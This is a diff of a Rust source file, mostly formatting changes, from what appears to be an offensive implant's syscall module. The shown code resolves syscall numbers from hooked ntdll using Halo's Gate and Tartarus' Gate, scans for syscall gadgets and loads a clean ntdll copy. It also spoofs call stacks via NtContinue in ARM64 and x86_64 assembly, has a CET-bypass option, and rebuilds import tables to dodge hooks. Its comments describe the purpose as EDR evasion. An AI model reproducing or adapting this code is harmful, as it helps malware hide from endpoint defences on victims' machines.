@@ -4,10 +4,12 @@
     any(target_arch = "x86_64", target_arch = "aarch64")
 ))]
 
-#[cfg(windows)]
-use common::lock::{MutexExt, RwLockExt};
 use anyhow::anyhow;
 use anyhow::Result;
+#[cfg(any(windows, all(unix, feature = "direct-syscalls")))]
+use common::lock::MutexExt;
+#[cfg(windows)]
+use common::lock::RwLockExt;
 #[cfg(windows)]
 use std::arch::asm;
 
@@ -135,8 +137,7 @@ static LINUX_SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, u32>>> = OnceLock::ne
 /// Global flag set by the SIGSYS handler when seccomp blocks a syscall.
 /// Using a global `AtomicBool` instead of `thread_local!` ensures the signal
 /// handler is fully async-signal-safe (no TLS lazy-init, no heap allocation).
-static SECCOMP_BLOCKED: std::sync::atomic::AtomicBool =
-    std::sync::atomic::AtomicBool::new(false);
+static SECCOMP_BLOCKED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
 
 /// SIGSYS signal handler.  Sets the global `SECCOMP_BLOCKED` flag so that
 /// `do_syscall` can detect the blocked call and return an error.
@@ -359,7 +360,7 @@ fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
 /// Returns an empty `Vec` if the PE export directory cannot be read.
 #[cfg(windows)]
 unsafe fn collect_nt_export_vas(module_base: usize) -> Vec<usize> {
-    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64};
+    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
     use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};
 
     let dos = &*(module_base as *const IMAGE_DOS_HEADER);
@@ -500,8 +501,10 @@ unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<S
 /// gadget address rather than the EDR-controlled trampoline address.
 #[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
-    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
-    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
+    use windows_sys::Win32::System::Diagnostics::Debug::{
+        IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
+    };
+    use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
 
     let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
     if dos.e_magic != 0x5A4D {
@@ -549,8 +552,10 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
 /// `ret` (0xD65F03C0).
 #[cfg(all(windows, target_arch = "aarch64"))]
 unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
-    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
-    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
+    use windows_sys::Win32::System::Diagnostics::Debug::{
+        IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
+    };
+    use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
 
     let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
     if dos.e_magic != 0x5A4D {
@@ -612,10 +617,7 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         //   0x4C 0x8B D1   — MOV R10, RCX
         //   0xB8 xx xx xx  — MOV EAX, <SSN>
         let prologue = std::slice::from_raw_parts(func_addr as *const u8, 2);
-        let is_hooked = !(
-            (prologue[0] == 0x4C && prologue[1] == 0x8B)
-            || prologue[0] == 0xB8
-        );
+        let is_hooked = !((prologue[0] == 0x4C && prologue[1] == 0x8B) || prologue[0] == 0xB8);
 
         if !is_hooked {
             if let Some(t) = parse_syscall_stub(func_addr) {
@@ -631,8 +633,8 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
                         "get_bootstrap_ssn: {func_name}: resolved SSN={} via exception-based (Tartarus' Gate)",
                         ssn
                     );
-                    let gadget_addr = scan_text_for_syscall_gadget(ntdll_base)
-                        .unwrap_or_else(|| func_addr);
+                    let gadget_addr =
+                        scan_text_for_syscall_gadget(ntdll_base).unwrap_or_else(|| func_addr);
                     return Some(SyscallTarget { ssn, gadget_addr });
                 }
                 tracing::debug!(
@@ -1108,7 +1110,8 @@ unsafe fn read_pe_timestamp(base: usize) -> u32 {
     if dos.e_magic != 0x5A4D {
         return 0;
     }
-    let nt = &*((base + dos.e_lfanew as usize) as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64);
+    let nt = &*((base + dos.e_lfanew as usize)
+        as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64);
     nt.FileHeader.TimeDateStamp
 }
 
@@ -1312,7 +1315,12 @@ fn resolve_ntcontinue_ssn() -> u32 {
     // context where map_clean_ntdll has not run).
     // Use read_recover() so a poisoned lock doesn't silently discard
     // the cached base address (HIGH-007).
-    let base = match CLEAN_NTDLL.read_recover().as_ref().filter(|&&b| b != 0).copied() {
+    let base = match CLEAN_NTDLL
+        .read_recover()
+        .as_ref()
+        .filter(|&&b| b != 0)
+        .copied()
+    {
         Some(b) => b,
         _ => {
             // Fall back to the loaded (potentially hooked) ntdll export.
@@ -1890,9 +1898,13 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             });
 
         #[cfg(not(feature = "stack-spoof"))]
-        struct ChainFrame { return_addr: usize }
+        struct ChainFrame {
+            return_addr: usize,
+        }
         #[cfg(not(feature = "stack-spoof"))]
-        struct ResolvedChain { frames: Vec<ChainFrame> }
+        struct ResolvedChain {
+            frames: Vec<ChainFrame>,
+        }
         #[cfg(not(feature = "stack-spoof"))]
         let _chain: Option<ResolvedChain> = None;
 
@@ -1931,123 +1943,123 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
                     if nstack > 0 {
                         // Fall through to simple fallback below.
                     } else {
-                    // ── No stack args: safe to use NtContinue spoofing ────
-                    // Frame buffer: [continuation] + [stack_args (empty)]
-                    let frame_elems = crate::stack_db::frame_buffer_slots(
-                        resolved_chain.frames.len(),
-                        nstack,
-                    );
-                    let mut spoof_frame_buf: Vec<u64> = vec![0u64; frame_elems];
-                    let cont_idx = crate::stack_db::populate_frame_buffer(
-                        &mut spoof_frame_buf,
-                        resolved_chain,
-                        stack_args,
-                    );
-                    // For ARM64, cont_idx is always 1 (continuation at buf[1]).
-                    // buf[0] holds the chain frame address that we'll set in CONTEXT.Lr.
-                    let cont_slot_ptr: *mut u64 = &mut spoof_frame_buf[cont_idx];
-
-                    // Build the ARM64 CONTEXT.  Must be 16-byte aligned.
-                    let ctx_size = std::mem::size_of::<CONTEXT>();
-                    let mut ctx_storage: Vec<u8> = vec![0u8; ctx_size + 15];
-                    let ctx_ptr_raw = ctx_storage.as_mut_ptr() as usize;
-                    let ctx_ptr_aligned = (ctx_ptr_raw + 15) & !15usize;
-                    let ctx: &mut CONTEXT = unsafe { &mut *(ctx_ptr_aligned as *mut CONTEXT) };
-
-                    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
-
-                    // ARM64 CONTEXT layout via the CONTEXT_u union:
-                    //   ctx.u.s.X0 .. ctx.u.s.X28  — integer registers
-                    //   ctx.u.s.Fp                  — frame pointer (x29)
-                    //   ctx.u.s.Lr                  — link register (x30)
-                    //   ctx.Sp                       — stack pointer
-                    //   ctx.Pc                       — program counter
-                    ctx.u.s_mut().X8 = ssn as u64;  // syscall number
-                    ctx.u.s_mut().X0 = a1;
-                    ctx.u.s_mut().X1 = a2;
-                    ctx.u.s_mut().X2 = a3;
-                    ctx.u.s_mut().X3 = a4;
-                    ctx.u.s_mut().X4 = a5;
-                    ctx.u.s_mut().X5 = a6;
-                    ctx.u.s_mut().X6 = a7;
-                    ctx.u.s_mut().X7 = a8;
-
-                    // Pc → syscall gadget (`svc #0; ret` in ntdll).
-                    ctx.Pc = gadget_addr as u64;
-
-                    // Lr → first chain frame's return address (a `ret` gadget
-                    // inside a system DLL).  After the gadget's `svc #0; ret`,
-                    // the CPU branches to this address, continuing the spoof.
-                    //
-                    // For the simplified single-frame approach, this `ret`
-                    // gadget needs to load x30 from the stack to reach our
-                    // continuation.  We use the chain frame address from buf[0].
-                    let chain_addr = spoof_frame_buf[0] as u64;
-                    ctx.u.s_mut().Lr = chain_addr;
-
-                    // Sp → our frame buffer.  The chain frame's epilogue will
-                    // load x30 from [Sp] (which is buf[1] = continuation).
-                    ctx.Sp = spoof_frame_buf.as_ptr() as u64;
-
-                    // Ensure writes are visible before the asm dispatch.
-                    // Full CPU fence for ARM64 weak memory model.
-                    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
-
-                    let nt_status: i32;
-                    unsafe {
-                        asm!(
-                            // Fill in the continuation address.
-                            // On ARM64, `adr x21, 2f` computes the address of
-                            // label 2 relative to the current PC.  x21 is
-                            // callee-saved so the kernel won't clobber it.
-                            "adr x21, 2f",
-                            "str x21, [{cont_slot}]",
-                            // NtContinue(PCONTEXT, BOOLEAN TestAlert)
-                            //   x0 = CONTEXT pointer
-                            //   x1 = FALSE (0) — no TestAlert
-                            //   x8 = NtContinue SSN
-                            "mov x0, {ctx_ptr}",
-                            "mov x1, xzr",
-                            "mov x8, {ntc_ssn}",
-                            // Direct `svc #0` for NtContinue — no fake frames.
-                            // The kernel restores our CONTEXT, setting up the
-                            // spoofed call stack before the target syscall runs.
-                            "svc #0",
-                            // ── Continuation ──────────────────────────────
-                            // Reached after: gadget `svc #0; ret` →
-                            //   CONTEXT.Lr (chain frame) →
-                            //   loads x30 from stack (continuation) →
-                            //   `ret` → here.
-                            // X0 holds the NTSTATUS from the target syscall.
-                            "2:",
-                            "mov {status:w}, w0",
-                            ctx_ptr   = in(reg) ctx_ptr_aligned as u64,
-                            cont_slot = in(reg) cont_slot_ptr as u64,
-                            ntc_ssn   = in(reg) ntcontinue_ssn as u64,
-                            status    = out(reg) nt_status,
-                            // x21 is used for the continuation address.
-                            // x0-x8, x9-x17 are clobbered by the syscall path.
-                            out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
-                            out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
-                            out("x8")  _,
-                            out("x9")  _, out("x10") _, out("x11") _,
-                            out("x12") _, out("x13") _, out("x14") _, out("x15") _,
-                            out("x16") _, out("x17") _,
-                            out("x21") _,
-                            out("x30") _,
-                            // Caller-saved NEON registers.
-                            out("v0")  _, out("v1")  _, out("v2")  _, out("v3")  _,
-                            out("v4")  _, out("v5")  _, out("v6")  _, out("v7")  _,
-                            out("v16") _, out("v17") _, out("v18") _, out("v19") _,
-                            out("v20") _, out("v21") _, out("v22") _, out("v23") _,
-                            out("v24") _, out("v25") _, out("v26") _, out("v27") _,
-                            out("v28") _, out("v29") _, out("v30") _, out("v31") _,
+                        // ── No stack args: safe to use NtContinue spoofing ────
+                        // Frame buffer: [continuation] + [stack_args (empty)]
+                        let frame_elems = crate::stack_db::frame_buffer_slots(
+                            resolved_chain.frames.len(),
+                            nstack,
                         );
-                    }
-                    // Keep buffers live.
-                    let _ = &spoof_frame_buf;
-                    let _ = &ctx_storage;
-                    return nt_status;
+                        let mut spoof_frame_buf: Vec<u64> = vec![0u64; frame_elems];
+                        let cont_idx = crate::stack_db::populate_frame_buffer(
+                            &mut spoof_frame_buf,
+                            resolved_chain,
+                            stack_args,
+                        );
+                        // For ARM64, cont_idx is always 1 (continuation at buf[1]).
+                        // buf[0] holds the chain frame address that we'll set in CONTEXT.Lr.
+                        let cont_slot_ptr: *mut u64 = &mut spoof_frame_buf[cont_idx];
+
+                        // Build the ARM64 CONTEXT.  Must be 16-byte aligned.
+                        let ctx_size = std::mem::size_of::<CONTEXT>();
+                        let mut ctx_storage: Vec<u8> = vec![0u8; ctx_size + 15];
+                        let ctx_ptr_raw = ctx_storage.as_mut_ptr() as usize;
+                        let ctx_ptr_aligned = (ctx_ptr_raw + 15) & !15usize;
+                        let ctx: &mut CONTEXT = unsafe { &mut *(ctx_ptr_aligned as *mut CONTEXT) };
+
+                        ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+
+                        // ARM64 CONTEXT layout via the CONTEXT_u union:
+                        //   ctx.u.s.X0 .. ctx.u.s.X28  — integer registers
+                        //   ctx.u.s.Fp                  — frame pointer (x29)
+                        //   ctx.u.s.Lr                  — link register (x30)
+                        //   ctx.Sp                       — stack pointer
+                        //   ctx.Pc                       — program counter
+                        ctx.u.s_mut().X8 = ssn as u64; // syscall number
+                        ctx.u.s_mut().X0 = a1;
+                        ctx.u.s_mut().X1 = a2;
+                        ctx.u.s_mut().X2 = a3;
+                        ctx.u.s_mut().X3 = a4;
+                        ctx.u.s_mut().X4 = a5;
+                        ctx.u.s_mut().X5 = a6;
+                        ctx.u.s_mut().X6 = a7;
+                        ctx.u.s_mut().X7 = a8;
+
+                        // Pc → syscall gadget (`svc #0; ret` in ntdll).
+                        ctx.Pc = gadget_addr as u64;
+
+                        // Lr → first chain frame's return address (a `ret` gadget
+                        // inside a system DLL).  After the gadget's `svc #0; ret`,
+                        // the CPU branches to this address, continuing the spoof.
+                        //
+                        // For the simplified single-frame approach, this `ret`
+                        // gadget needs to load x30 from the stack to reach our
+                        // continuation.  We use the chain frame address from buf[0].
+                        let chain_addr = spoof_frame_buf[0] as u64;
+                        ctx.u.s_mut().Lr = chain_addr;
+
+                        // Sp → our frame buffer.  The chain frame's epilogue will
+                        // load x30 from [Sp] (which is buf[1] = continuation).
+                        ctx.Sp = spoof_frame_buf.as_ptr() as u64;
+
+                        // Ensure writes are visible before the asm dispatch.
+                        // Full CPU fence for ARM64 weak memory model.
+                        std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
+
+                        let nt_status: i32;
+                        unsafe {
+                            asm!(
+                                // Fill in the continuation address.
+                                // On ARM64, `adr x21, 2f` computes the address of
+                                // label 2 relative to the current PC.  x21 is
+                                // callee-saved so the kernel won't clobber it.
+                                "adr x21, 2f",
+                                "str x21, [{cont_slot}]",
+                                // NtContinue(PCONTEXT, BOOLEAN TestAlert)
+                                //   x0 = CONTEXT pointer
+                                //   x1 = FALSE (0) — no TestAlert
+                                //   x8 = NtContinue SSN
+                                "mov x0, {ctx_ptr}",
+                                "mov x1, xzr",
+                                "mov x8, {ntc_ssn}",
+                                // Direct `svc #0` for NtContinue — no fake frames.
+                                // The kernel restores our CONTEXT, setting up the
+                                // spoofed call stack before the target syscall runs.
+                                "svc #0",
+                                // ── Continuation ──────────────────────────────
+                                // Reached after: gadget `svc #0; ret` →
+                                //   CONTEXT.Lr (chain frame) →
+                                //   loads x30 from stack (continuation) →
+                                //   `ret` → here.
+                                // X0 holds the NTSTATUS from the target syscall.
+                                "2:",
+                                "mov {status:w}, w0",
+                                ctx_ptr   = in(reg) ctx_ptr_aligned as u64,
+                                cont_slot = in(reg) cont_slot_ptr as u64,
+                                ntc_ssn   = in(reg) ntcontinue_ssn as u64,
+                                status    = out(reg) nt_status,
+                                // x21 is used for the continuation address.
+                                // x0-x8, x9-x17 are clobbered by the syscall path.
+                                out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
+                                out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
+                                out("x8")  _,
+                                out("x9")  _, out("x10") _, out("x11") _,
+                                out("x12") _, out("x13") _, out("x14") _, out("x15") _,
+                                out("x16") _, out("x17") _,
+                                out("x21") _,
+                                out("x30") _,
+                                // Caller-saved NEON registers.
+                                out("v0")  _, out("v1")  _, out("v2")  _, out("v3")  _,
+                                out("v4")  _, out("v5")  _, out("v6")  _, out("v7")  _,
+                                out("v16") _, out("v17") _, out("v18") _, out("v19") _,
+                                out("v20") _, out("v21") _, out("v22") _, out("v23") _,
+                                out("v24") _, out("v25") _, out("v26") _, out("v27") _,
+                                out("v28") _, out("v29") _, out("v30") _, out("v31") _,
+                            );
+                        }
+                        // Keep buffers live.
+                        let _ = &spoof_frame_buf;
+                        let _ = &ctx_storage;
+                        return nt_status;
                     } // end nstack == 0 branch
                 }
                 // NtContinue SSN unavailable — fall through to simple blr path.
@@ -2334,15 +2346,19 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
 
     let import_dir_rva = match opt_magic {
         windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
-            let nt_headers32 = nt_base as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
+            let nt_headers32 = nt_base
+                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
             (*nt_headers32).OptionalHeader.DataDirectory
-                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
+                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT
+                    as usize]
                 .VirtualAddress
         }
         windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
-            let nt_headers64 = nt_base as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
+            let nt_headers64 = nt_base
+                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
             (*nt_headers64).OptionalHeader.DataDirectory
-                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
+                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT
+                    as usize]
                 .VirtualAddress
         }
         _ => anyhow::bail!("Unsupported PE optional-header magic: 0x{:x}", opt_magic),
@@ -2351,8 +2367,8 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
         return Ok(()); // No imports
     }
 
-    let mut import_desc =
-        (base + import_dir_rva as usize) as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR;
+    let mut import_desc = (base + import_dir_rva as usize)
+        as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR;
 
     // M-26 Part D: resolve NtProtectVirtualMemory once for IAT protection changes.
     type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
@@ -2463,7 +2479,9 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                 (*import_desc).FirstThunk
             };
 
-            if opt_magic == windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC {
+            if opt_magic
+                == windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC
+            {
                 let mut original_thunk = (base + original_thunk_rva as usize)
                     as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;
                 let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
@@ -2476,8 +2494,10 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                     num_thunks += 1;
                     temp_thunk = temp_thunk.add(1);
                 }
-                let iat_size =
-                    (num_thunks + 1) * std::mem::size_of::<windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32>();
+                let iat_size = (num_thunks + 1)
+                    * std::mem::size_of::<
+                        windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32,
+                    >();
 
                 let mut old_protect = 0u32;
                 {
@@ -2503,7 +2523,9 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
 
                 while (*original_thunk).u1.AddressOfData != 0 {
                     let addr_of_data = (*original_thunk).u1.AddressOfData;
-                    let proc_addr = if (addr_of_data & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG32) != 0
+                    let proc_addr = if (addr_of_data
+                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG32)
+                        != 0
                     {
                         let ordinal = (addr_of_data & 0xffff) as u16;
                         let addr = get_export_addr_by_ordinal(dep_handle as usize, ordinal as u32);
@@ -2575,8 +2597,10 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                     num_thunks += 1;
                     temp_thunk = temp_thunk.add(1);
                 }
-                let iat_size =
-                    (num_thunks + 1) * std::mem::size_of::<windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64>();
+                let iat_size = (num_thunks + 1)
+                    * std::mem::size_of::<
+                        windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64,
+                    >();
 
                 let mut old_protect = 0u32;
                 {
@@ -2602,7 +2626,9 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
 
                 while (*original_thunk).u1.AddressOfData != 0 {
                     let addr_of_data = (*original_thunk).u1.AddressOfData as u64;
-                    let proc_addr = if (addr_of_data & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG64) != 0
+                    let proc_addr = if (addr_of_data
+                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG64)
+                        != 0
                     {
                         let ordinal = (addr_of_data & 0xffff) as u16;
                         // Resolve via clean export table instead of hookable GetProcAddress (M-24/M-26).
@@ -2687,7 +2713,9 @@ unsafe fn pe_nt_base_and_magic(base: usize) -> Option<(usize, u16)> {
         return None;
     }
 
-    let opt_magic = *((nt_base + 4 + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>())
+    let opt_magic = *((nt_base
+        + 4
+        + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>())
         as *const u16);
     Some((nt_base, opt_magic))
 }
@@ -2695,19 +2723,27 @@ unsafe fn pe_nt_base_and_magic(base: usize) -> Option<(usize, u16)> {
 #[cfg(windows)]
 unsafe fn get_export_dir_any_bitness(
     base: usize,
-) -> Option<(u32, u32, *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY)> {
+) -> Option<(
+    u32,
+    u32,
+    *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY,
+)> {
     let (nt_base, opt_magic) = pe_nt_base_and_magic(base)?;
 
     let export_data_dir = match opt_magic {
         windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
-            let nt_headers32 = nt_base as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
+            let nt_headers32 = nt_base
+                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
             (*nt_headers32).OptionalHeader.DataDirectory
-                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
+                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_EXPORT
+                    as usize]
         }
         windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
-            let nt_headers64 = nt_base as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
+            let nt_headers64 = nt_base
+                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
             (*nt_headers64).OptionalHeader.DataDirectory
-                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
+                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_EXPORT
+                    as usize]
         }
         _ => return None,
     };
@@ -2866,7 +2902,12 @@ pub unsafe fn bounded_transmute<D>(val: u64) -> D {
     std::mem::transmute_copy::<u64, D>(&val)
 }
 
-#[cfg(all(windows, target_arch = "x86_64", feature = "cet-bypass", not(feature = "stack-spoof")))]
+#[cfg(all(
+    windows,
+    target_arch = "x86_64",
+    feature = "cet-bypass",
+    not(feature = "stack-spoof")
+))]
 #[macro_export]
 macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -2987,7 +3028,12 @@ macro_rules! clean_call {
 /// return address is a legitimate `ret` gadget in a system DLL).
 /// It falls back to the CET call-chain registry, then to single-gadget
 /// spoof_call.
-#[cfg(all(windows, target_arch = "x86_64", feature = "cet-bypass", feature = "stack-spoof"))]
+#[cfg(all(
+    windows,
+    target_arch = "x86_64",
+    feature = "cet-bypass",
+    feature = "stack-spoof"
+))]
 #[macro_export]
 macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -3087,7 +3133,12 @@ macro_rules! clean_call {
     }};
 }
 
-#[cfg(all(windows, target_arch = "x86_64", not(feature = "cet-bypass"), not(feature = "stack-spoof")))]
+#[cfg(all(
+    windows,
+    target_arch = "x86_64",
+    not(feature = "cet-bypass"),
+    not(feature = "stack-spoof")
+))]
 #[macro_export]
 macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -3143,7 +3194,12 @@ macro_rules! clean_call {
 /// legitimate system-DLL function as the return address to EDR walkers.
 /// If no chain is available (e.g. gadget cache not yet populated), it
 /// falls back to the single-gadget `spoof_call`.
-#[cfg(all(windows, target_arch = "x86_64", not(feature = "cet-bypass"), feature = "stack-spoof"))]
+#[cfg(all(
+    windows,
+    target_arch = "x86_64",
+    not(feature = "cet-bypass"),
+    feature = "stack-spoof"
+))]
 #[macro_export]
 macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -3385,7 +3441,10 @@ macro_rules! trampoline_spoof {
 /// Stub `trampoline_spoof!` when the feature is disabled (or on ARM64 where
 /// trampoline-spoof is not yet supported) — falls back to `clean_call!`
 /// unconditionally.
-#[cfg(all(windows, not(all(feature = "trampoline-spoof", target_arch = "x86_64"))))]
+#[cfg(all(
+    windows,
+    not(all(feature = "trampoline-spoof", target_arch = "x86_64"))
+))]
 #[macro_export]
 macro_rules! trampoline_spoof {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -4667,11 +4726,7 @@ pub unsafe fn spoof_call_chain(
     // Use the first chain frame's return address as the spoofed return site.
     // This is a `ret` gadget inside a legitimate function body — much better
     // than a bare `jmp rbx` gadget for EDR evasion.
-    let frame0_addr = chain
-        .frames
-        .first()
-        .map(|f| f.return_addr)
-        .unwrap_or(0);
+    let frame0_addr = chain.frames.first().map(|f| f.return_addr).unwrap_or(0);
 
     std::arch::asm!(
         "push rbx",
@@ -4741,8 +4796,6 @@ pub unsafe fn spoof_call_chain(
     );
     status
 }
-
-
 
 #[cfg(all(windows, target_arch = "aarch64"))]
 #[doc(hidden)]
@@ -4925,9 +4978,7 @@ pub fn do_syscall_with_strategy(
                             "kernel-proxy: unsupported syscall '{}', falling back to indirect",
                             other
                         );
-                        return unsafe {
-                            do_syscall(target.ssn, target.gadget_addr, args)
-                        };
+                        return unsafe { do_syscall(target.ssn, target.gadget_addr, args) };
                     }
                 };
                 let mut proxy_args = [0u64; 6];
